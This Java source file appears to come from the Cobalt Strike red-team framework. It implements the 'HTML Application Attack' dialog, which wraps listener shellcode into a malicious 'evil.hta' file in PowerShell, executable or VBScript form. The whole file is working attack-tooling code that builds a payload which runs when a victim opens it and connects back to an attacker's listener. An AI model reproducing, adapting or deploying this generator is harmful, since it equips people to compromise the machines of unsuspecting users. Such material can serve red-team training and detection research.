package aggressor.dialogs;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import aggressor.GlobalDataManager;
import common.CommonUtils;
import common.MutantResourceUtils;
import dialog.*;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.HashMap;
import java.util.Map;

public class HTMLApplicationDialog implements DialogListener,
        SafeDialogCallback {
    protected AggressorClient client;
    protected JFrame dialog = null;
    protected Map options;

    public HTMLApplicationDialog(AggressorClient client) {
        this.client = client;
    }

    @Override
    public void dialogAction(ActionEvent event, HashMap<String, Object> options) {
        this.options = options;
        SafeDialogs.saveFile(null, "evil.hta", this);
    }

    @Override
    public void dialogResult(String outfile) {
        String listener = DialogUtils.string(this.options, "listener");
        String method = DialogUtils.string(this.options, "method");
        byte[] stager = DataUtils.shellcode(GlobalDataManager.getGlobalDataManager(), listener);
        if ("PowerShell".equals(method)) {
            CommonUtils.writeToFile(new File(outfile), new MutantResourceUtils(this.client).buildHTMLApplicationPowerShell(stager));
        } else if ("Executable".equals(method)) {
            String name = CommonUtils.strrep(new File(outfile).getName(), ".hta", ".exe");
            byte[] app = new MutantResourceUtils(this.client).buildHTMLApplicationEXE(stager, name);
            CommonUtils.writeToFile(new File(outfile), app);
        } else if ("VBA".equals(method)) {
            String app = "<html><head><script language=\"vbscript\">\n";
            app = app + CommonUtils.bString(new MutantResourceUtils(this.client).buildVBS(stager)) + "\n";
            app = app + "self.close\n";
            app = app + "</script></head></html>";
            CommonUtils.writeToFile(new File(outfile), CommonUtils.toBytes(app));
        }
        DialogUtils.showInfo("Congrats. You're the owner of an HTML app package.");
    }

    public void show() {
        this.dialog = DialogUtils.dialog("HTML Application Attack", 640, 480);
        DialogManager controller = new DialogManager(this.dialog);
        controller.addDialogListener(this);
        controller.listener("listener", "Listener:", this.client.getConnection(), this.client.getData());
        controller.combobox("method", "Method:  ", CommonUtils.toArray("Executable, PowerShell, VBA"));
        JButton ok = controller.action("Generate");
        JButton help = controller.help("https://www.cobaltstrike.com/help-html-application-attack");
        this.dialog.add(DialogUtils.description("This package generates an HTML application that runs a payload."), "North");
        this.dialog.add(controller.layout(), "Center");
        this.dialog.add(DialogUtils.center(ok, help), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}

